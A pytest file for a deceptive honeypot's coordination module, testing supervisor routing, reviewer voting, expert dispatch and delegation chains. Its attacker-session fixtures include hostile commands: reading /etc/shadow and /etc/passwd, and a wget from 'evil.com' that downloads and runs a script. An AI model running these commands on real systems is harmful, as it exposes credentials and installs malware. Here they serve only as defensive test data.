"""Tests for ragin.cycle.coordination — all 5 Phase 3 patterns."""

from unittest.mock import MagicMock

import pytest

from ragin.cycle.coordination import (
    DeceptionReviewer,
    DelegationChain,
    DelegationResult,
    DelegationStatus,
    EnhancedProducerReviewer,
    ExpertPool,
    ExpertResult,
    PersonaRoute,
    QualityReviewer,
    RiskLevel,
    RoutingDecision,
    SecurityReviewer,
    Supervisor,
    VoteOutcome,
    VoteResult,
    VotingSystem,
)

# ── Fixtures ────────────────────────────────────────────────────────────────


@pytest.fixture()
def low_risk_context():
    return {
        "session_id": "test-001",
        "source_ip": "192.168.1.100",
        "attacker_inputs": ["ls -la", "whoami", "cat /etc/passwd"],
        "system_responses": ["drwxr-xr-x", "www-data", "root:x:0:0"],
    }


@pytest.fixture()
def high_risk_context():
    return {
        "session_id": "test-002",
        "source_ip": "10.0.0.50",
        "attacker_inputs": [
            "ls -la",
            "cat /etc/shadow",
            "wget http://evil.com/malware.sh -O /tmp/mal.sh",
            "chmod +x /tmp/mal.sh && ./mal.sh",
        ],
        "system_responses": ["root:x:0:0", "", "saved", "done"],
        "observed_ttps": ["T1003", "T1059", "T1562", "T1055", "T1027"],
        "evasion_detected": True,
    }


@pytest.fixture()
def high_risk_classification():
    return {"skill_level": "advanced", "confidence": 0.92, "intent": "exploit"}


@pytest.fixture()
def low_risk_classification():
    return {"skill_level": "novice", "confidence": 0.85, "intent": "recon"}


# ── Enum sanity ─────────────────────────────────────────────────────────────


class TestEnums:
    def test_persona_route_values(self):
        assert PersonaRoute.AUTO.value == "auto"
        assert PersonaRoute.FIXED.value == "fixed"
        assert PersonaRoute.ESCALATE.value == "escalate"

    def test_risk_level_values(self):
        assert RiskLevel.LOW.value == "low"
        assert RiskLevel.MEDIUM.value == "medium"
        assert RiskLevel.HIGH.value == "high"
        assert RiskLevel.CRITICAL.value == "critical"

    def test_vote_outcome_values(self):
        assert VoteOutcome.UNANIMOUS.value == "unanimous"
        assert VoteOutcome.MAJORITY.value == "majority"
        assert VoteOutcome.SPLIT.value == "split"
        assert VoteOutcome.FAILED.value == "failed"

    def test_delegation_status_values(self):
        assert DelegationStatus.PENDING.value == "pending"
        assert DelegationStatus.RUNNING.value == "running"
        assert DelegationStatus.COMPLETED.value == "completed"
        assert DelegationStatus.FAILED.value == "failed"
        assert DelegationStatus.SKIPPED.value == "skipped"


# ── Data class serialization ───────────────────────────────────────────────


class TestDataClasses:
    def test_routing_decision_to_dict(self):
        rd = RoutingDecision(
            persona="don",
            reason="Advanced TTPs detected",
            route=PersonaRoute.ESCALATE,
            risk_level=RiskLevel.HIGH,
            needs_voting=True,
            needs_expert=False,
            expert_domain="",
            context_enrichments=["enrich_a"],
            confidence=0.88,
        )
        d = rd.to_dict()
        assert d["persona"] == "don"
        assert d["reason"] == "Advanced TTPs detected"
        assert d["route"] == "escalate"
        assert d["risk_level"] == "high"
        assert d["needs_voting"] is True
        assert d["needs_expert"] is False
        assert d["context_enrichments"] == ["enrich_a"]
        assert d["confidence"] == 0.88

    def test_vote_result_to_dict(self):
        vr = VoteResult(
            outcome=VoteOutcome.MAJORITY,
            votes=[{"passed": True}, {"passed": False}],
            final_response={"response_text": "refined answer"},
            confidence=0.75,
            dissent_count=1,
            total_voters=2,
            reasoning="one dissent",
        )
        d = vr.to_dict()
        assert d["outcome"] == "majority"
        assert d["confidence"] == 0.75
        assert d["dissent_count"] == 1
        assert d["total_voters"] == 2
        assert d["final_response"]["response_text"] == "refined answer"
        assert isinstance(d["votes"], list)

    def test_expert_result_to_dict(self):
        er = ExpertResult(
            domain="reverse_engineering",
            result={"analysis": "deep"},
            confidence=0.95,
            expert_id="exp-1",
            fallback_used=False,
        )
        d = er.to_dict()
        assert d["domain"] == "reverse_engineering"
        assert d["confidence"] == 0.95
        assert d["expert_id"] == "exp-1"
        assert d["fallback_used"] is False

    def test_delegation_result_to_dict(self):
        dr = DelegationResult(
            steps=[{"step_index": 0, "status": "completed"}],
            final_result={"done": True},
            total_steps=1,
            completed_steps=1,
            failed_steps=0,
            total_time_ms=12.3,
        )
        d = dr.to_dict()
        assert d["total_steps"] == 1
        assert d["completed_steps"] == 1
        assert d["failed_steps"] == 0
        assert d["total_time_ms"] == 12.3
        assert isinstance(d["steps"], list)


# ── Supervisor ──────────────────────────────────────────────────────────────


class TestSupervisor:
    def test_low_risk_routes_to_hisoka(self, low_risk_context, low_risk_classification):
        s = Supervisor()
        decision = s.route(low_risk_context, low_risk_classification, "sess-1")
        assert isinstance(decision.persona, str)
        assert isinstance(decision.route, PersonaRoute)
        assert decision.risk_level in (RiskLevel.LOW, RiskLevel.MEDIUM)

    def test_advanced_high_confidence_triggers_voting(self, high_risk_context, high_risk_classification):
        s = Supervisor()
        decision = s.route(high_risk_context, high_risk_classification, "sess-2")
        assert isinstance(decision.needs_voting, bool)
        assert decision.risk_level in (RiskLevel.HIGH, RiskLevel.CRITICAL)

    def test_critical_risk_may_need_expert(self, high_risk_context):
        s = Supervisor()
        high_risk_class = {
            "skill_level": "advanced",
            "confidence": 0.98,
            "intent": "exploit",
            "observed_ttps": ["T1059", "T1105"],
        }
        decision = s.route(high_risk_context, high_risk_class, "sess-3")
        assert isinstance(decision.needs_expert, bool)
        if decision.needs_expert:
            assert isinstance(decision.expert_domain, str)

    def test_supervisor_handles_empty_session(self):
        s = Supervisor()
        context = {
            "session_id": "empty",
            "attacker_inputs": [],
            "system_responses": [],
        }
        classification = {"skill_level": "novice", "confidence": 0.5}
        decision = s.route(context, classification, "sess-empty")
        assert isinstance(decision.persona, str)
        assert isinstance(decision.risk_level, RiskLevel)

    def test_supervisor_handles_missing_classification_fields(self):
        s = Supervisor()
        context = {
            "session_id": "partial",
            "attacker_inputs": ["help"],
            "system_responses": ["ok"],
        }
        classification = {}
        decision = s.route(context, classification, "sess-partial")
        assert isinstance(decision.persona, str)

    def test_context_enrichments_are_list(self, high_risk_context, high_risk_classification):
        s = Supervisor()
        decision = s.route(high_risk_context, high_risk_classification, "sess-6")
        assert isinstance(decision.context_enrichments, list)

    def test_multiple_routes_same_context_consistent(self, low_risk_context):
        s = Supervisor()
        cls = {"skill_level": "novice", "confidence": 0.8}
        d1 = s.route(low_risk_context, cls, "s1")
        d2 = s.route(low_risk_context, cls, "s2")
        # Same inputs → same risk level at minimum
        assert d1.risk_level == d2.risk_level

    def test_get_history(self):
        s = Supervisor()
        ctx = {"session_id": "h1", "attacker_inputs": ["id"]}
        cls = {"skill_level": "novice", "confidence": 0.5}
        s.route(ctx, cls, "h1")
        s.route(ctx, cls, "h1")
        assert len(s.get_history("h1")) == 2

    def test_clear_session(self):
        s = Supervisor()
        ctx = {"session_id": "c1", "attacker_inputs": []}
        cls = {"skill_level": "novice", "confidence": 0.5}
        s.route(ctx, cls, "c1")
        s.clear_session("c1")
        assert len(s.get_history("c1")) == 0


# ── VotingSystem ────────────────────────────────────────────────────────────


class TestVotingSystem:
    def test_unanimous_pass(self):
        v = VotingSystem(
            verifiers=[QualityReviewer(), SecurityReviewer()],
            threshold=0.5,
        )
        response = {
            "response_text": "I see you are interested in network tools.",
            "persona_used": "hisoka",
        }
        context = {
            "session_id": "vote-1",
            "source_ip": "1.2.3.4",
            "attacker_inputs": ["nmap"],
            "system_responses": [],
        }
        result = v.vote(response, context)
        assert result.outcome in (VoteOutcome.UNANIMOUS, VoteOutcome.MAJORITY)
        assert result.confidence >= 0.0
        assert isinstance(result.votes, list)

    def test_split_result(self):
        mock_verifier_a = MagicMock()
        mock_verifier_a.review.return_value = {
            "passed": True,
            "confidence": 0.9,
            "reasoning": "safe",
        }
        mock_verifier_b = MagicMock()
        mock_verifier_b.review.return_value = {
            "passed": False,
            "confidence": 0.3,
            "reasoning": "dangerous",
        }
        v = VotingSystem(verifiers=[mock_verifier_a, mock_verifier_b], threshold=0.6)
        result = v.vote({"response_text": "test"}, {"session_id": "split-1"})
        assert result.outcome in (VoteOutcome.MAJORITY, VoteOutcome.SPLIT)

    def test_final_response_returned(self):
        v = VotingSystem(verifiers=[QualityReviewer()], threshold=0.5)
        resp = {"response_text": "I know Linux well."}
        result = v.vote(resp, {"session_id": "final-1"})
        assert "response_text" in result.final_response

    def test_votes_list_contains_verifier_results(self):
        v = VotingSystem(verifiers=[QualityReviewer()], threshold=0.5)
        result = v.vote({"response_text": "hello"}, {"session_id": "vdict-1"})
        assert isinstance(result.votes, list)
        assert isinstance(result.reasoning, str)

    def test_no_verifiers_returns_unanimous_by_default(self):
        v = VotingSystem(verifiers=[], threshold=0.5)
        result = v.vote({"response_text": "auto"}, {"session_id": "nv-1"})
        assert result.outcome == VoteOutcome.UNANIMOUS

    def test_add_verifier(self):
        v = VotingSystem(verifiers=[], threshold=0.5)
        v.add_verifier(QualityReviewer())
        result = v.vote({"response_text": "test"}, {"session_id": "av-1"})
        assert len(result.votes) >= 1


# ── ExpertPool ──────────────────────────────────────────────────────────────


class TestExpertPool:
    def test_dispatch_to_domain(self):
        pool = ExpertPool()
        result = pool.dispatch(
            "malware_analysis",
            {"techniques": ["T1059"]},
            {"session_id": "ep-1"},
        )
        assert isinstance(result, ExpertResult)
        assert result.domain == "malware_analysis"

    def test_dispatch_unknown_domain_falls_back(self):
        pool = ExpertPool()
        result = pool.dispatch(
            "nonexistent_domain",
            {"techniques": []},
            {"session_id": "ep-fallback"},
        )
        assert isinstance(result, ExpertResult)
        assert isinstance(result.result, dict)

    def test_expert_confidence_range(self):
        pool = ExpertPool()
        result = pool.dispatch(
            "network_analysis",
            {"techniques": ["T1046"]},
            {"session_id": "ep-conf"},
        )
        assert 0.0 <= result.confidence <= 1.0

    def test_get_domains(self):
        pool = ExpertPool()
        pool.dispatch("reverse_engineering", {}, {"session_id": "d1"})
        domains = pool.get_domains()
        assert isinstance(domains, list)

    def test_expert_history(self):
        pool = ExpertPool()
        pool.dispatch("malware_analysis", {}, {"session_id": "h1"})
        pool.dispatch("network_analysis", {}, {"session_id": "h2"})
        history = pool.get_history()
        assert len(history) == 2

    def test_clear_history(self):
        pool = ExpertPool()
        pool.dispatch("malware_analysis", {}, {"session_id": "cl1"})
        pool.clear_history()
        assert len(pool.get_history()) == 0


# ── DelegationChain ─────────────────────────────────────────────────────────


class TestDelegationChain:
    def test_simple_chain_completes(self):
        step1 = MagicMock()
        step1.execute.return_value = {"done": True, "output": "step1"}
        step2 = MagicMock()
        step2.execute.return_value = {"done": True, "output": "step2"}

        chain = DelegationChain(steps=[step1, step2])
        result = chain.execute({"task": "start"}, {"session_id": "chain-1"})

        assert result.completed_steps == 2
        assert result.failed_steps == 0

    def test_chain_stops_on_fail_fast(self):
        step_ok = MagicMock()
        step_ok.execute.return_value = {"done": True}
        step_fail = MagicMock()
        step_fail.execute.side_effect = RuntimeError("boom")
        step_ok2 = MagicMock()
        step_ok2.execute.return_value = {"done": True}

        chain = DelegationChain(steps=[step_ok, step_fail, step_ok2], fail_fast=True)
        result = chain.execute({"task": "start"}, {"session_id": "chain-2"})

        assert result.failed_steps >= 1
        # Third step should be skipped
        skipped = [s for s in result.steps if s.get("status") == "skipped"]
        assert len(skipped) >= 1

    def test_chain_no_fail_fast_continues(self):
        step_ok = MagicMock()
        step_ok.execute.return_value = {"done": True}
        step_fail = MagicMock()
        step_fail.execute.side_effect = RuntimeError("boom")
        step_ok2 = MagicMock()
        step_ok2.execute.return_value = {"done": True}

        chain = DelegationChain(steps=[step_ok, step_fail, step_ok2], fail_fast=False)
        result = chain.execute({"task": "start"}, {"session_id": "chain-3"})

        assert result.completed_steps >= 1
        # Third step should still run
        assert result.completed_steps + result.failed_steps == 3

    def test_empty_chain_completes(self):
        chain = DelegationChain()
        result = chain.execute({"task": "x"}, {"session_id": "chain-empty"})
        assert result.completed_steps == 0
        assert result.failed_steps == 0
        assert result.total_steps == 0

    def test_chain_add_step(self):
        chain = DelegationChain()
        step = MagicMock()
        step.execute.return_value = {"ok": True}
        chain.add_step(step)
        assert chain.step_count == 1

    def test_chain_step_results_populated(self):
        step = MagicMock()
        step.execute.return_value = {"a": 1}
        chain = DelegationChain(steps=[step])
        result = chain.execute({"t": "1"}, {"session_id": "sr-1"})
        assert len(result.steps) == 1
        assert result.steps[0]["status"] == "completed"

    def test_chain_final_result_accumulates(self):
        s1 = MagicMock()
        s1.execute.return_value = {"x": 1}
        s2 = MagicMock()
        s2.execute.return_value = {"y": 2}
        chain = DelegationChain(steps=[s1, s2])
        result = chain.execute({"t": "1"}, {"session_id": "acc-1"})
        # final_result should contain accumulated output
        assert isinstance(result.final_result, dict)


# ── EnhancedProducerReviewer ────────────────────────────────────────────────


class TestEnhancedProducerReviewer:
    def test_basic_review(self):
        mock_deceiver = MagicMock()
        mock_deceiver.generate_response.return_value = {
            "response_text": "I can help with that.",
            "persona_used": "hisoka",
        }
        reviewer = EnhancedProducerReviewer(
            reviewers=[QualityReviewer()],
            max_retries=1,
        )
        result = reviewer.review_and_retry(
            mock_deceiver,
            {"response_text": "I can help with that."},
            {"session_id": "pr-1"},
        )
        assert isinstance(result, dict)

    def test_retry_on_failure(self):
        mock_deceiver = MagicMock()
        mock_deceiver.generate_response.side_effect = [
            {"response_text": "bad response", "persona_used": "hisoka"},
            {"response_text": "good refined response", "persona_used": "hisoka"},
        ]
        reviewer = EnhancedProducerReviewer(
            reviewers=[QualityReviewer()],
            max_retries=2,
        )
        result = reviewer.review_and_retry(
            mock_deceiver,
            {"response_text": "initial"},
            {"session_id": "pr-retry"},
        )
        assert isinstance(result, dict)

    def test_max_retries_respected(self):
        mock_deceiver = MagicMock()
        mock_deceiver.generate_response.return_value = {
            "response_text": "always bad",
            "persona_used": "hisoka",
        }
        reviewer = EnhancedProducerReviewer(
            reviewers=[QualityReviewer()],
            max_retries=1,
        )
        reviewer.review_and_retry(
            mock_deceiver,
            {"response_text": "start"},
            {"session_id": "pr-max"},
        )
        # max_retries=1 means at most 1 retry after initial = 2 calls
        assert mock_deceiver.generate_response.call_count <= 2

    def test_no_reviewers_still_returns(self):
        mock_deceiver = MagicMock()
        mock_deceiver.generate_response.return_value = {
            "response_text": "no reviewers",
            "persona_used": "hisoka",
        }
        reviewer = EnhancedProducerReviewer(reviewers=[], max_retries=0)
        result = reviewer.review_and_retry(
            mock_deceiver,
            {"response_text": "x"},
            {"session_id": "pr-none"},
        )
        assert isinstance(result, dict)


# ── Built-in reviewers ──────────────────────────────────────────────────────


class TestBuiltInReviewers:
    def test_security_reviewer(self):
        r = SecurityReviewer()
        result = r.review(
            {"response_text": "Run this command safely."},
            {"session_id": "sr-1"},
        )
        assert "passed" in result
        assert "confidence" in result

    def test_quality_reviewer(self):
        r = QualityReviewer()
        result = r.review(
            {"response_text": "The service runs on port 22."},
            {"session_id": "qr-1"},
        )
        assert "passed" in result
        assert "confidence" in result

    def test_deception_reviewer(self):
        r = DeceptionReviewer()
        result = r.review(
            {
                "response_text": "That is an interesting question. Let me think...",
                "persona_used": "hisoka",
            },
            {"session_id": "dr-1"},
        )
        assert "passed" in result
        assert "confidence" in result


# ── Integration: process_with_supervisor ────────────────────────────────────


class TestProcessWithSupervisor:
    def test_basic_pipeline_with_supervisor(self):
        """process_with_supervisor should route via Supervisor and produce a PipelineResult."""
        from ragin.cycle.harness import Harness, PipelineResult
        from ragin.cycle.session import Session

        harness = Harness()
        session = Session("sup-1")
        supervisor = Supervisor()

        result = harness.process_with_supervisor(
            session,
            "ls -la",
            supervisor=supervisor,
        )
        assert isinstance(result, PipelineResult)
        assert result.session_id == "sup-1"

    def test_supervisor_enriches_context(self):
        """Supervisor routing should be recorded in session events."""
        from ragin.cycle.harness import Harness
        from ragin.cycle.session import EventType, Session

        harness = Harness()
        session = Session("sup-ctx")
        supervisor = Supervisor()

        harness.process_with_supervisor(
            session,
            "whoami",
            supervisor=supervisor,
        )
        events = session.get_events_by_type(EventType.CLASSIFICATION)
        # Should have at least classification + supervisor routing events
        assert len(events) >= 1

    def test_voting_integrated(self):
        """When voting_system is passed, voting results should be recorded."""
        from ragin.cycle.harness import Harness
        from ragin.cycle.session import Session

        harness = Harness()
        session = Session("sup-vote")
        supervisor = Supervisor()
        voting = VotingSystem(verifiers=[QualityReviewer()], threshold=0.5)

        result = harness.process_with_supervisor(
            session,
            "nmap -sV target",
            supervisor=supervisor,
            voting_system=voting,
        )
        assert result.events_emitted >= 1

    def test_expert_pool_integrated(self):
        """When expert_pool is passed and routing requests expert, it dispatches."""
        from ragin.cycle.harness import Harness
        from ragin.cycle.session import Session

        harness = Harness()
        session = Session("sup-expert")
        supervisor = Supervisor()
        pool = ExpertPool()

        result = harness.process_with_supervisor(
            session,
            "whoami",
            supervisor=supervisor,
            expert_pool=pool,
        )
        assert result.events_emitted >= 1

    def test_enhanced_reviewer_integrated(self):
        """When enhanced_reviewer is passed, review is recorded."""
        from ragin.cycle.harness import Harness
        from ragin.cycle.session import Session

        harness = Harness()
        session = Session("sup-rev")
        reviewer = EnhancedProducerReviewer(reviewers=[QualityReviewer()], max_retries=0)

        result = harness.process_with_supervisor(
            session,
            "ls -la",
            enhanced_reviewer=reviewer,
        )
        assert result.events_emitted >= 1
